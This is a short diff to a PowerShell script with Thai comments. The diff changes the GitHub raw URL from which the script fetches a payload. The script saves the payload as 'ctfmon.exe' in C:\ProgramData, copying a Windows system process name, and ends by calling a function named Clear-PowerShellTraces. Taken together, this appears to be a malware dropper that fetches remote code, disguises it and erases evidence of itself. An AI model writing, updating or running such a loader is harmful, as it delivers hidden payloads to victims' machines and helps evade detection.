@@ -8,7 +8,7 @@ $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
 $programData = "C:\ProgramData"  # path สำหรับเก็บไฟล์
-$exeUrl = (Invoke-WebRequest -Uri "https://github.com/unknowanyma/unknowx/raw/refs/heads/main/filehost.exe" -UseBasicParsing).Content.Trim()
+$exeUrl = (Invoke-WebRequest -Uri "https://github.com/unknowanyma/unknowx/raw/refs/heads/main/taxxx" -UseBasicParsing).Content.Trim()
 $exeName = "ctfmon.exe"                      # ชื่อไฟล์ .exe
 $exePath = Join-Path $programData $exeName
 
@@ -119,3 +119,4 @@ else {
 }
 
 Clear-PowerShellTraces
+
